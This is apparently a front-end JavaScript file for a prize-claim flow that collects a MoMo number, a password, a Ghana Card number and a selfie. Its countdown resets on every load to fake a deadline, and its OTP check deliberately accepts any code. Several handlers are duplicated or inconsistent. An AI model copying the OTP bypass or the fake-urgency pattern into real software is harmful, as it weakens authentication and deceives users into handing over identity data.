import {
  dummyWinners,
  findWinnerByPhone,
  updateWinnerData,
} from "./dummyData.js";

// DOM Elements
const claimBtn = document.querySelector(".claim-cta");
const countdownDisplay = document.getElementById("countdown-display");
const countdownValues = document.querySelectorAll(".countdown-value");
const countdownLabels = document.querySelectorAll(".countdown-label");
const phoneInput = document.getElementById("phone");
const sendOtpBtn = document.getElementById("sendOtpBtn");
const otpInput = document.getElementById("otp");
const verifyOtpBtn = document.getElementById("verifyOtpBtn");
const resendOtp = document.getElementById("resendOtp");
const otpTimer = document.getElementById("otpTimer");
const accountForm = document.getElementById("accountForm");
const contractForm = document.getElementById("contractForm");
const kycForm = document.getElementById("kycForm");
const acceptContractBtn = document.getElementById("acceptContractBtn");
const termCheckboxes = document.querySelectorAll(
  '.contract-terms input[type="checkbox"]'
);
const ghanaCardInput = document.getElementById("ghanaCard");
const fileInput = document.getElementById("fileInput");
const previewImage = document.getElementById("previewImage");
const retakePhoto = document.getElementById("retakePhoto");
const submitKycBtn = document.getElementById("submitKycBtn");

// State
let currentUser = null;
let otpCountdown;
let otpCode = "";
let countdownInterval;
let file = null;

function startCountdown() {
  // Set the target date to 5 days from now
  const now = new Date();
  const targetDate = new Date(now);
  targetDate.setDate(now.getDate() + 5);

  // Set the initial countdown values
  updateCountdown(targetDate);

  // Update the countdown every second
  clearInterval(countdownInterval);
  countdownInterval = setInterval(() => updateCountdown(targetDate), 1000);
}

function updateCountdown(targetDate) {
  const now = new Date();
  let timeRemaining = targetDate - now;

  // If countdown is over, clear the interval
  if (timeRemaining < 0) {
    clearInterval(countdownInterval);
    if (countdownDisplay) {
      countdownDisplay.textContent = "Time's up!";
    }
    document
      .querySelectorAll(".countdown-value")
      .forEach((el) => (el.textContent = "00"));
    return;
  }

  // Calculate time units
  const totalSeconds = Math.floor(timeRemaining / 1000);
  const days = Math.floor(totalSeconds / (3600 * 24));
  const hours = Math.floor((totalSeconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((totalSeconds % 3600) / 60);
  const seconds = totalSeconds % 60;

  // Update the numeric countdown display (00Days 00Hours 00Minutes 00Seconds)
  const countdownElements = document.querySelectorAll(".countdown-value");
  if (countdownElements.length >= 4) {
    countdownElements[0].textContent = days.toString().padStart(2, "0");
    countdownElements[1].textContent = hours.toString().padStart(2, "0");
    countdownElements[2].textContent = minutes.toString().padStart(2, "0");
    countdownElements[3].textContent = seconds.toString().padStart(2, "0");
  }

  // Update the banner display (X days, Y hours, Z minutes, W seconds)
  if (countdownDisplay) {
    countdownDisplay.textContent = `${days}d ${hours
      .toString()
      .padStart(2, "0")}h ${minutes.toString().padStart(2, "0")}m ${seconds
      .toString()
      .padStart(2, "0")}s`;
  }
}

// Modal Management
let currentModal = null;

function showModal(modalId) {
  // Hide current modal if any
  if (currentModal) {
    currentModal.classList.remove("show");
  }

  // Show new modal
  currentModal = document.getElementById(modalId);
  if (currentModal) {
    currentModal.classList.add("show");
    document.body.style.overflow = "hidden";
  }
}

function hideModal() {
  if (currentModal) {
    currentModal.classList.remove("show");
    currentModal = null;
    document.body.style.overflow = "";
  }
}

// Initialize OTP Flow
function initOtpFlow() {
  if (sendOtpBtn) {
    sendOtpBtn.addEventListener("click", handleSendOtp);
  }

  if (verifyOtpBtn) {
    verifyOtpBtn.addEventListener("click", handleVerifyOtp);
  }

  if (resendOtp) {
    resendOtp.addEventListener("click", handleResendOtp);
  }

  // Add event listeners for OTP input fields
  const otpInputs = document.querySelectorAll(".otp-digit");
  otpInputs.forEach((input, index) => {
    // Handle input
    input.addEventListener("input", (e) => {
      // Only allow numbers
      e.target.value = e.target.value.replace(/[^0-9]/g, "");

      // Move to next input if current input has a value
      if (e.target.value && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }

      // Enable/disable verify button based on OTP completion
      const allFilled = Array.from(otpInputs).every((input) => input.value);
      verifyOtpBtn.disabled = !allFilled;
    });

    // Handle backspace
    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !e.target.value && index > 0) {
        otpInputs[index - 1].focus();
      }
    });
  });
}

// Handle Send OTP
function handleSendOtp() {
  const phone = phoneInput.value.trim();

  if (!phone) {
    const errorMessage = document.getElementById("error-message");
    errorMessage.textContent = "Please enter your MoMo account number";
    showModal("errorModal");
    return;
  }

  // Find if the phone number is a winner
  const winner = findWinnerByPhone(phone);

  if (!winner) {
    const errorMessage = document.getElementById("error-message");
    errorMessage.textContent =
      "This phone number is not registered as a winner. Please check and try again.";
    showModal("errorModal");
    return;
  }

  currentUser = winner;

  // Generate a 6-digit OTP
  otpCode = Math.floor(100000 + Math.random() * 900000).toString();

  // In a real app, you would send this OTP via SMS
  console.log(`OTP for ${phone}: ${otpCode}`);

  // Show OTP input and start countdown
  document.getElementById("otpSection").style.display = "block";
  startOtpCountdown();

  // Disable send OTP button for 30 seconds
  sendOtpBtn.disabled = true;
  setTimeout(() => {
    sendOtpBtn.disabled = false;
  }, 30000);
}

// Handle Verify OTP - Modified to accept any 6-digit code
function handleVerifyOtp() {
  // Get all OTP input fields
  const otpInputs = document.querySelectorAll(".otp-digit");
  let enteredOtp = "";

  // Combine all OTP digits
  otpInputs.forEach((input) => {
    enteredOtp += input.value || "0"; // Use '0' if empty to ensure we get 6 digits
  });

  // Ensure we have exactly 6 digits (pad with zeros if needed)
  enteredOtp = enteredOtp.padEnd(6, "0").substring(0, 6);

  console.log("OTP verification bypassed. Using code:", enteredOtp);

  // Proceed to account creation
  hideModal();
  showModal("createAccountModal");

  // Pre-fill phone number in account form
  const accountPhone = document.getElementById("accountPhone");
  if (accountPhone && currentUser) {
    accountPhone.value = currentUser.phone;
  }

  // Clear OTP fields
  otpInputs.forEach((input) => {
    input.value = "";
  });
}

// Handle Resend OTP
function handleResendOtp() {
  handleSendOtp();
  resendOtp.style.display = "none";
}

// Initialize Account Form
function initAccountForm() {
  if (!accountForm) return;

  accountForm.addEventListener("submit", (e) => {
    e.preventDefault();

    const email = document.getElementById("accountEmail").value.trim();
    const password = document.getElementById("accountPassword").value;
    const confirmPassword = document.getElementById(
      "accountConfirmPassword"
    ).value;
    const isAccountHolder = document.getElementById("accountHolder").checked;

    // Validate form
    if (!email) {
      alert("Please enter your email address");
      return;
    }

    if (password.length < 8) {
      alert("Password must be at least 8 characters long");
      return;
    }

    if (password !== confirmPassword) {
      alert("Passwords do not match");
      return;
    }

    if (!isAccountHolder) {
      alert("You must confirm that you are the MoMo account holder");
      return;
    }

    // Update user data
    currentUser.email = email;
    updateWinnerData(currentUser.phone, {
      email: email,
      verified: true,
    });

    // Show contract acceptance modal
    hideModal();
    showModal("contractModal");
  });
}

// Initialize Contract Form
function initContractForm() {
  const contractForm = document.getElementById("contractForm");
  if (!contractForm) return;

  // Get all term checkboxes and the accept button
  const termCheckboxes = document.querySelectorAll(".term-checkbox");
  const acceptButton = document.getElementById("acceptContractBtn");
  const backButton = contractForm.querySelector(".back-btn");

  // Function to check if all required checkboxes are checked
  function checkAllTermsAccepted() {
    const allChecked = Array.from(termCheckboxes).every(
      (checkbox) => checkbox.checked
    );
    acceptButton.disabled = !allChecked;
    return allChecked;
  }

  // Add change event to all checkboxes
  termCheckboxes.forEach((checkbox) => {
    checkbox.addEventListener("change", function () {
      // Toggle the 'checked' class on the parent for styling
      const parent = this.closest(".contract-item");
      if (parent) {
        parent.classList.toggle("checked", this.checked);
      }
      checkAllTermsAccepted();
    });
  });

  // Handle form submission
  contractForm.addEventListener("submit", (e) => {
    e.preventDefault();

    if (checkAllTermsAccepted()) {
      // Update user data
      updateWinnerData(currentUser.phone, {
        contractAccepted: true,
        contractAcceptedAt: new Date().toISOString(),
        termsAccepted: true,
        privacyAccepted: true,
      });

      // Show KYC verification modal
      hideModal();
      showModal("kycModal");
    }
  });

  // Back button functionality
  if (backButton) {
    backButton.addEventListener("click", (e) => {
      e.preventDefault();
      hideModal();
      showModal("createAccountModal");
    });
  }
}

// Camera functionality
let stream = null;
let currentFacingMode = "user"; // 'user' for front camera, 'environment' for back camera
let capturedImage = null;

// Start camera function
async function startCamera() {
  try {
    const cameraModal = document.getElementById("cameraModal");
    const cameraVideo = document.getElementById("cameraVideo");

    cameraModal.style.display = "flex";
    document.body.style.overflow = "hidden";

    // Stop any existing streams
    if (stream) {
      stopCamera();
    }

    // Request camera access with better constraints
    const constraints = {
      video: {
        facingMode: currentFacingMode,
        width: { ideal: 1280 },
        height: { ideal: 720 },
      },
      audio: false,
    };

    stream = await navigator.mediaDevices.getUserMedia(constraints);

    // Show camera feed
    cameraVideo.srcObject = stream;
    await cameraVideo.play();

    // Set canvas dimensions to match video
    const cameraCanvas = document.getElementById("cameraCanvas");
    cameraCanvas.width = cameraVideo.videoWidth;
    cameraCanvas.height = cameraVideo.videoHeight;
  } catch (err) {
    console.error("Error accessing camera:", err);
    alert(
      "Could not access the camera. Please check your permissions and try again."
    );
    stopCamera();
  }
}

// Stop camera function
function stopCamera() {
  if (stream) {
    stream.getTracks().forEach((track) => track.stop());
    stream = null;
  }
  const cameraModal = document.getElementById("cameraModal");
  if (cameraModal) {
    cameraModal.style.display = "none";
  }
  document.body.style.overflow = "";
}

// Switch between front and back camera
async function switchCamera() {
  currentFacingMode = currentFacingMode === "user" ? "environment" : "user";
  await startCamera();
}

// Capture image from camera
function captureImage() {
  const cameraVideo = document.getElementById("cameraVideo");
  const cameraCanvas = document.getElementById("cameraCanvas");
  const ctx = cameraCanvas.getContext("2d");

  // Draw current video frame to canvas
  ctx.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);

  // Convert canvas to blob
  cameraCanvas.toBlob(
    (blob) => {
      // Create a file from the blob
      const file = new File([blob], "selfie.jpg", { type: "image/jpeg" });
      capturedImage = file;

      // Display the captured image
      displayImagePreview(file);

      // Stop the camera
      stopCamera();

      // Update the file input
      const fileInput = document.getElementById("fileInput");
      const dataTransfer = new DataTransfer();
      dataTransfer.items.add(file);
      fileInput.files = dataTransfer.files;
    },
    "image/jpeg",
    0.9
  );
}

// Initialize KYC Form
function initKycForm() {
  const kycForm = document.getElementById("kycForm");
  const ghanaCardInput = document.getElementById("ghanaCard");
  const fileInput = document.getElementById("fileInput");
  const previewImage = document.getElementById("previewImage");
  const uploadPreview = document.getElementById("uploadPreview");
  const uploadPlaceholder = document.getElementById("uploadPlaceholder");
  const retakeBtn = document.getElementById("retakeBtn");
  const submitKycBtn = document.getElementById("submitKycBtn");
  const backBtn = kycForm?.querySelector(".back-btn");
  const cameraOption = document.getElementById("cameraOption");
  const fileOption = document.getElementById("fileOption");
  const cameraInput = document.getElementById("cameraInput");
  const cameraModal = document.getElementById("cameraModal");
  const cameraVideo = document.getElementById("cameraVideo");
  const captureBtn = document.getElementById("captureBtn");
  const closeCameraBtn = document.getElementById("closeCameraBtn");
  const switchCameraBtn = document.getElementById("switchCameraBtn");
  const cameraCanvas = document.getElementById("cameraCanvas");
  const ctx = cameraCanvas.getContext("2d");

  // Format Ghana Card input
  if (ghanaCardInput) {
    ghanaCardInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length > 9) {
        value = value.slice(0, 9) + "-" + value[9];
      }
      e.target.value = value;
      validateKycForm();
    });
  }

  // Handle file selection
  if (fileInput) {
    fileInput.addEventListener("change", (e) => {
      const file = e.target.files[0];
      if (file) {
        capturedImage = file;
        displayImagePreview(file);
      }
    });
  }

  // Handle camera option click
  if (cameraOption) {
    cameraOption.addEventListener("click", (e) => {
      e.preventDefault();
      startCamera();
    });
  }

  // Handle file option click
  if (fileOption) {
    fileOption.addEventListener("click", (e) => {
      e.preventDefault();
      fileInput.click();
    });
  }

  // Handle capture button
  if (captureBtn) {
    captureBtn.addEventListener("click", captureImage);
  }

  // Handle close camera button
  if (closeCameraBtn) {
    closeCameraBtn.addEventListener("click", stopCamera);
  }

  // Handle switch camera button
  if (switchCameraBtn) {
    switchCameraBtn.addEventListener("click", switchCamera);
  }

  // Handle retake photo
  if (retakeBtn) {
    retakeBtn.addEventListener("click", () => {
      resetImagePreview();
    });
  }

  // Handle form submission
  if (kycForm) {
    kycForm.addEventListener("submit", (e) => {
      e.preventDefault();
      submitKyc();
    });
  }

  // Validate form
  function validateKycForm() {
    if (!ghanaCardInput || !submitKycBtn) return false;

    const isGhanaCardValid = ghanaCardInput.validity.valid;
    const hasImage =
      (previewImage && previewImage.src && previewImage.src !== "") ||
      capturedImage;

    submitKycBtn.disabled = !(isGhanaCardValid && hasImage);
    return isGhanaCardValid && hasImage;
  }

  // Display image preview
  function displayImagePreview(file) {
    const reader = new FileReader();
    reader.onload = (e) => {
      previewImage.src = e.target.result;
      uploadPlaceholder.style.display = "none";
      document.querySelector(".preview-container").style.display = "flex";
      validateKycForm();
    };
    reader.readAsDataURL(file);
  }

  // Reset image preview
  function resetImagePreview() {
    const uploadPlaceholder = document.getElementById("uploadPlaceholder");
    const previewContainer = document.querySelector(".preview-container");
    const previewImage = document.getElementById("previewImage");
    const fileInput = document.getElementById("fileInput");

    if (uploadPlaceholder) uploadPlaceholder.style.display = "flex";
    if (previewContainer) previewContainer.style.display = "none";
    if (previewImage) previewImage.src = "";
    if (fileInput) fileInput.value = "";

    capturedImage = null;
    validateKycForm();
  }

  // Submit KYC
  function submitKyc() {
    if (!validateKycForm()) return;

    const ghanaCard = ghanaCardInput.value.trim();

    // In a real app, you would upload the file and submit the form data here
    console.log("Submitting KYC:", {
      ghanaCard,
      hasImage: !!capturedImage,
    });

    // Update user data
    if (currentUser) {
      updateWinnerData(currentUser.phone, {
        ghanaCard: ghanaCard,
        kycCompleted: true,
        kycVerifiedAt: new Date().toISOString(),
      });
    }

    // Show success message
    hideModal();
    showSuccessMessage();
  }

  // Clean up camera on page unload
  window.addEventListener("beforeunload", () => {
    if (stream) {
      stopCamera();
    }
  });
}

// Show success message
function showSuccessMessage() {
  const successHtml = `
    <div class="success-message">
      <h2>🎉 Congratulations! 🎉</h2>
      <p>Your prize claim has been successfully submitted!</p>
      <p>You'll receive an email/SMS confirmation shortly.</p>
      <p>Next step: A Visa agent will contact you by phone/email to start your visa application process.</p>
      <button class="btn primary-btn" onclick="hideModal()">Close</button>
    </div>
  `;

  const modal = document.createElement("div");
  modal.className = "modal show";
  modal.innerHTML = `
    <div class="modal-content" style="max-width: 600px; text-align: center;">
      <span class="close-btn">&times;</span>
      ${successHtml}
    </div>
  `;

  document.body.appendChild(modal);

  // Add close button handler
  modal.querySelector(".close-btn").addEventListener("click", () => {
    document.body.removeChild(modal);
    document.body.style.overflow = "";
  });

  document.body.style.overflow = "hidden";
}

// Initialize Modals
function initModals() {
  // Close modals when clicking outside
  window.addEventListener("click", (e) => {
    if (e.target.classList.contains("modal")) {
      hideModal();
    }
  });

  // Close button handlers
  document.querySelectorAll(".close-btn").forEach((btn) => {
    btn.addEventListener("click", hideModal);
  });
}

// Start OTP Countdown
function startOtpCountdown() {
  let seconds = 120; // 2 minutes

  otpCountdown = setInterval(() => {
    seconds--;
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;

    if (otpTimer) {
      otpTimer.textContent = `${minutes}:${remainingSeconds
        .toString()
        .padStart(2, "0")} `;
    }

    if (seconds <= 0) {
      clearInterval(otpCountdown);
      if (resendOtp) {
        resendOtp.style.display = "inline";
      }
    }
  }, 1000);
}

// Event Listeners
document.addEventListener("DOMContentLoaded", () => {
  // Start the countdown
  startCountdown();

  // Initialize modals
  initModals();

  // Initialize OTP functionality
  initOtpFlow();

  // Initialize account form
  if (accountForm) {
    initAccountForm();
  }

  // Initialize contract form
  if (contractForm) {
    initContractForm();
  }

  // Initialize KYC form
  if (kycForm) {
    initKycForm();
  }

  // Claim button click handler
  claimBtn.addEventListener("click", () => {
    showModal("phoneVerificationModal");
  });

  // Close button handlers
  document.querySelectorAll(".close-btn").forEach((btn) => {
    btn.addEventListener("click", hideModal);
  });

  // Handle clicks outside modal
  window.addEventListener("click", (e) => {
    if (e.target.classList.contains("modal")) {
      hideModal();
    }
  });

  // Back button handlers
  document.querySelectorAll(".back-btn").forEach((btn) => {
    btn.addEventListener("click", (e) => {
      e.preventDefault();
      const currentStep = e.target.closest(".modal").id;
      // Add logic to handle back navigation between steps
      if (currentStep === "createAccountModal") {
        showModal("phoneVerificationModal");
      } else if (currentStep === "contractModal") {
        showModal("createAccountModal");
      } else if (currentStep === "kycModal") {
        showModal("contractModal");
      }
    });
  });

  // Phone verification form
  const phoneForm = document.getElementById("phoneVerificationForm");
  const sendOtpBtn = document.getElementById("sendOtpBtn");
  const verifyOtpBtn = document.getElementById("verifyOtpBtn");
  const otpSection = document.getElementById("otpSection");
  const otpInput = document.getElementById("otp");
  const otpTimer = document.getElementById("otpTimer");
  const resendOtp = document.getElementById("resendOtp");

  let otpCountdown;
  let otpTimeLeft = 120; // 2 minutes in seconds

  // Verify OTP
  verifyOtpBtn.addEventListener("click", () => {
    const otp = otpInput.value;

    // In a real app, you would verify the OTP here
    // For demo purposes, we'll accept any 6-digit code
    if (otp.length === 6 && /^\d+$/.test(otp)) {
      clearInterval(otpCountdown);
      document.getElementById("nextBtn").disabled = false;
      verifyOtpBtn.textContent = "Verified ✓";
      verifyOtpBtn.style.backgroundColor = "#4CAF50";
    }
  });

  // Next button in phone verification
  document.getElementById("nextBtn").addEventListener("click", () => {
    const phone = document.getElementById("phone").value;
    const winner = findWinnerByPhone(phone);

    if (winner) {
      // Pre-fill the account creation form
      document.getElementById("accountPhone").value = winner.phone;
      document.getElementById("email").value = winner.email || "";

      // Show the account creation modal
      hideModal();
      showModal("createAccountModal");
    }
  });

  // Account creation form
  document
    .getElementById("createAccountForm")
    .addEventListener("submit", (e) => {
      e.preventDefault();

      // In a real app, you would create the account here
      hideModal();
      showModal("contractModal");
    });

  // Contract acceptance
  const acceptContractBtn = document.getElementById("acceptContractBtn");
  const termCheckboxes = document.querySelectorAll(
    'input[type="checkbox"]',
    'input[name="terms"]',
    "#termsAgreement",
    "#privacyAgreement"
  );

  function updateAcceptButton() {
    // Get all required checkboxes in the contract form
    const requiredCheckboxes = document.querySelectorAll(
      '#contractForm input[type="checkbox"][required]'
    );

    // Check if all required checkboxes are checked
    const allChecked = Array.from(requiredCheckboxes).every(
      (checkbox) => checkbox.checked
    );

    // Enable/disable the accept button
    if (acceptContractBtn) {
      acceptContractBtn.disabled = !allChecked;
    }
  }

  termCheckboxes.forEach((checkbox) => {
    checkbox.addEventListener("change", updateAcceptButton);
  });

  acceptContractBtn.addEventListener("click", () => {
    const winnerPhone = document.getElementById("accountPhone").value;
    updateWinnerData(winnerPhone, { contractAccepted: true });
    hideModal();
    showModal("kycModal");
  });

  // KYC Form
  document.getElementById("kycForm").addEventListener("submit", (e) => {
    e.preventDefault();

    const ghanaCard = document.getElementById("ghanaCard").value;
    const winnerPhone = document.getElementById("accountPhone").value;

    // In a real app, you would verify the Ghana Card and selfie here
    updateWinnerData(winnerPhone, {
      ghanaCard,
      kycCompleted: true,
      verified: true,
    });

    hideModal();
    showModal("successModal");
  });

  // Success modal actions
  document.getElementById("downloadContract").addEventListener("click", () => {
    // In a real app, this would generate and download a PDF
    alert("Contract download will be available in the full version");
  });

  document.getElementById("finishBtn").addEventListener("click", () => {
    hideModal();
    // Reset forms for next use
    document.querySelectorAll("form").forEach((form) => form.reset());
  });

  // OK button handler for error modal
  document.querySelectorAll(".ok-btn").forEach((btn) => {
    btn.addEventListener("click", hideModal);
  });

  // Helper function for OTP countdown
  function startOtpCountdown() {
    otpTimeLeft = 120; // Reset to 2 minutes
    updateOtpTimer();
    clearInterval(otpCountdown);

    otpCountdown = setInterval(() => {
      otpTimeLeft--;
      updateOtpTimer();

      if (otpTimeLeft <= 0) {
        clearInterval(otpCountdown);
        resendOtp.style.display = "inline";
      }
    }, 1000);
  }

  function updateOtpTimer() {
    const minutes = Math.floor(otpTimeLeft / 60);
    const seconds = otpTimeLeft % 60;
    otpTimer.textContent = `${minutes.toString().padStart(2, "0")}:${seconds
      .toString()
      .padStart(2, "0")} `;
  }

  // Resend OTP
  resendOtp.addEventListener("click", (e) => {
    e.preventDefault();
    resendOtp.style.display = "none";
    startOtpCountdown();
    // In a real app, you would resend the OTP here
    console.log("OTP resent");
  });

  // Toggle password visibility
  document.getElementById("togglePassword").addEventListener("click", () => {
    const passwordInput = document.getElementById("password");
    const icon = document.getElementById("togglePassword");

    if (passwordInput.type === "password") {
      passwordInput.type = "text";
      icon.textContent = "👁️";
    } else {
      passwordInput.type = "password";
      icon.textContent = "👁️";
    }
  });

  // Selfie upload
  const selfieUpload = document.getElementById("selfieUpload");
  const selfieInput = document.getElementById("selfieInput");
  const previewContainer = document.getElementById("previewContainer");
  const imagePreview = document.getElementById("imagePreview");
  const retakePhoto = document.getElementById("retakePhoto");

  selfieUpload.addEventListener("click", () => {
    selfieInput.click();
  });

  selfieInput.addEventListener("change", (e) => {
    const file = e.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (event) => {
        imagePreview.src = event.target.result;
        selfieUpload.style.display = "none";
        previewContainer.style.display = "block";
      };
      reader.readAsDataURL(file);
    }
  });

  retakePhoto.addEventListener("click", () => {
    selfieUpload.style.display = "flex";
    previewContainer.style.display = "none";
    selfieInput.value = "";
  });

  // Check age for parental consent
  document.getElementById("ghanaCard").addEventListener("blur", (e) => {
    const ghanaCard = e.target.value;
    // Extract birth date from Ghana Card (simplified example)
    // In a real app, you would parse the Ghana Card number properly
    const winnerPhone = document.getElementById("accountPhone").value;
    const winner = findWinnerByPhone(winnerPhone);

    if (winner && winner.age < 21) {
      document.getElementById("parentalConsent").style.display = "block";
    } else {
      document.getElementById("parentalConsent").style.display = "none";
    }
  });
});

// Password strength meter
document.getElementById("password")?.addEventListener("input", function (e) {
  const password = e.target.value;
  const strengthBar = document.querySelector(".strength-bar");
  const strengthText = document.querySelector(".strength-text");

  // Reset
  strengthBar.style.width = "0%";
  strengthBar.style.backgroundColor = "#ff4444";
  strengthText.textContent = "Password strength";

  if (password.length === 0) {
    return;
  }

  // Calculate strength (simplified)
  let strength = 0;
  if (password.length >= 8) strength += 25;
  if (password.match(/[a-z]+/)) strength += 25;
  if (password.match(/[A-Z]+/)) strength += 25;
  if (password.match(/[0-9]+/)) strength += 25;

  // Update UI
  strengthBar.style.width = `${strength}%`;

  if (strength < 50) {
    strengthBar.style.backgroundColor = "#ff4444";
    strengthText.textContent = "Weak";
  } else if (strength < 75) {
    strengthBar.style.backgroundColor = "#ffbb33";
    strengthText.textContent = "Moderate";
  } else {
    strengthBar.style.backgroundColor = "#00C851";
    strengthText.textContent = "Strong";
  }
});
